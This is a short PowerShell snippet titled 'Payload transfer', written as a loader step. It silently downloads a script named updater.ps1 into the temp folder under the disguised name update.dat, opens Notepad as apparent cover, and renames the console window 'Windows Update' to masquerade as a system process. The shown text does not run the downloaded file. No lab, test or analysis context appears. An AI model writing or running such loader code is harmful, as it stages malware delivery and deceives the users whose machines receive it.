# Payload transfer
try { curl.exe -s -L -o "$env:TEMP\update.dat" "https://localhost:8081/updater.ps1"; Start-Process -FilePath "notepad.exe" -ErrorAction SilentlyContinue; $Host.UI.RawUI.WindowTitle = "Windows Update" } catch { Write-Warning "Loader step failed" }
